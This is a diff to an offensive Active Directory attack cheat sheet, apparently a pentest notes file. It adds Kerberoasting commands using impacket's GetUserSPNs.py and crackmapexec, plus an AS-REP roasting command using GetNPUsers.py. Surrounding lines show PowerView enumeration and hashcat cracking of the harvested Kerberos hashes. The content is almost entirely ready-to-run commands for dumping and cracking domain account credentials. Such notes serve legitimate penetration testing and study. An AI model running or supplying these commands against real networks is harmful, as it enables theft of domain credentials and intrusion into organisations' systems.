@@ -360,6 +360,15 @@ Server username: NT AUTHORITY\SYSTEM
 Get-DomainUser -SPN | select name,serviceprincipalname
 ```
 
+> using [impacket](https://github.com/SecureAuthCorp/impacket) :
+```powershell
+GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+```
+> using [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)
+```powershell
+crackmapexec ldap $target -u $user -p $password --kerberoasting kerberoastable.txt --kdcHost $kdc
+```
+
 *crack the hash :*
 
 ```bash
@@ -376,6 +385,9 @@ hashcat -m 13100 -a 0 spn.txt wordlist.txt --force
 Get-DomainUser -PreauthNotRequired | select name
 ```
 
+```powershell
+GetNPUsers.py -format hashcat -outputfile ASREProastables.txt -dc-ip $kdc '$domain/$user:$password' -request
+```
 
 *cracking the hash :*
 
